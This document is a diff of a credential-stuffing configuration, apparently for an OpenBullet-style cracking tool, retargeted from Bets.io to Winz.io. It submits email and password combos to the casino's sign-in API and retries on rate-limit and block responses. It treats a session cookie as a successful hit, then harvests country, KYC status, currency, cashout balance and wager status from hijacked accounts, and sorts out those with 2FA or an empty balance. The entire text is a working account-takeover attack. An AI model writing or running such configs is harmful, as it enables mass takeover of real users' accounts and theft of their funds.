@@ -1,6 +1,6 @@
 [SETTINGS]
 {
-  "Name": "Bets.io",
+  "Name": "Winz.io",
   "SuggestedBots": 100,
   "MaxCPM": 0,
   "LastModified": "2024-08-01T03:33:33.3333333-07:00",
@@ -40,7 +40,7 @@
   "CustomUserAgent": "",
   "RandomUA": false,
   "CustomCMDArgs": "",
-  "Title": "BETS",
+  "Title": "WINZ",
   "IconPath": "Icon\\svbfile.ico",
   "LicenseSource": null,
   "Message": null,
@@ -62,47 +62,57 @@
 }
 
 [SCRIPT]
-#SHA256 FUNCTION Hash SHA256 "<PASS>" -> VAR "SHA" 
-
-#users/sign_in REQUEST POST "https://api.bets.io/api/users/sign_in" ReadResponseSource=FALSE 
-  CONTENT "{\"user\":{\"email\":\"<USER>\",\"password\":\"<SHA>\"}}" 
+#api/users/sign_in REQUEST POST "https://www.winz.io/api/users/sign_in" ReadResponseSource=FALSE 
+  CONTENT "{\"user\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
   CONTENTTYPE "application/json" 
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
   HEADER "Pragma: no-cache" 
-  HEADER "Accept: application/vnd.softswiss.v1+json" 
+  HEADER "Accept: application/vnd.softswiss.v1+json, application/vnd.softswiss.v2+json" 
 
-#Valid? KEYCHECK 
+#200_OK? KEYCHECK 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+    KEY "<RESPONSECODE>" EqualTo "429" 
   KEYCHAIN Failure OR 
     KEY "<RESPONSECODE>" EqualTo "422" 
   KEYCHAIN Success OR 
     KEY "<COOKIES(_casino_session)>" Contains "eyJ" 
 
-#api/player REQUEST GET "https://api.bets2.io/api/player" 
+#/api/player REQUEST GET "https://www.winz.io/api/player" 
   
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
   HEADER "Pragma: no-cache" 
-  HEADER "Accept: application/vnd.softswiss.v1+json" 
+  HEADER "Accept: application/vnd.softswiss.v1+json, application/vnd.softswiss.v2+json" 
 
-#2FA PARSE "<SOURCE>" LR "\"two_factor_enabled\":" "," -> VAR "2FA" 
+#2FA? KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "two_factor_enabled\":true" 
 
-#Country PARSE "<SOURCE>" LR "\"country\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+#country PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "Country" 
 
-#player/accounts REQUEST GET "https://api.bets2.io/api/player/accounts?compatibility=false" 
+#sumsub_verified PARSE "<SOURCE>" JSON "sumsub_verified" CreateEmpty=FALSE -> CAP "KYC?" 
+
+#api/player/accounts REQUEST GET "https://www.winz.io/api/player/accounts" 
   
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
   HEADER "Pragma: no-cache" 
-  HEADER "Accept: application/vnd.softswiss.v1+json" 
+  HEADER "Accept: application/vnd.softswiss.v1+json, application/vnd.softswiss.v2+json" 
 
-#Cashout PARSE "<SOURCE>" LR "available_to_cashout_cents\":" "," Recursive=TRUE -> VAR "Cashout" 
+#currency PARSE "<SOURCE>" JSON "currency" Recursive=TRUE CreateEmpty=FALSE -> CAP "Currency" 
 
-#$? KEYCHECK BanOnToCheck=FALSE 
+#available_to_cashout PARSE "<SOURCE>" JSON "available_to_cashout_cents" Recursive=TRUE CreateEmpty=FALSE -> CAP "Balance" 
+
+#wager_status PARSE "<SOURCE>" JSON "wager_status" Recursive=TRUE CreateEmpty=FALSE -> CAP "Rollover" 
+
+#Balance? KEYCHECK BanOnToCheck=FALSE 
   KEYCHAIN Custom "CUSTOM" OR 
-    KEY "<2FA>" EqualTo "true" 
-    KEY "<Cashout>" EqualTo "[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]" 
-
-!#AmountCents PARSE "<SOURCE>" LR "\"amount_cents\":" "," Recursive=TRUE CreateEmpty=FALSE -> CAP "AmountCents" 
-
-#Cashout PARSE "<SOURCE>" LR "available_to_cashout_cents\":" "," Recursive=TRUE CreateEmpty=FALSE -> CAP "Cashout" 
-
-!#WagerStatus PARSE "<SOURCE>" LR "wager_status\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "WagerStatus" 
+    KEY "<Balance>" DoesNotContain "1" 
+    KEY "<Balance>" DoesNotContain "2" 
+    KEY "<Balance>" DoesNotContain "3" 
+    KEY "<Balance>" DoesNotContain "4" 
+    KEY "<Balance>" DoesNotContain "5" 
+    KEY "<Balance>" DoesNotContain "6" 
+    KEY "<Balance>" DoesNotContain "7" 
+    KEY "<Balance>" DoesNotContain "8" 
+    KEY "<Balance>" DoesNotContain "9" 
 
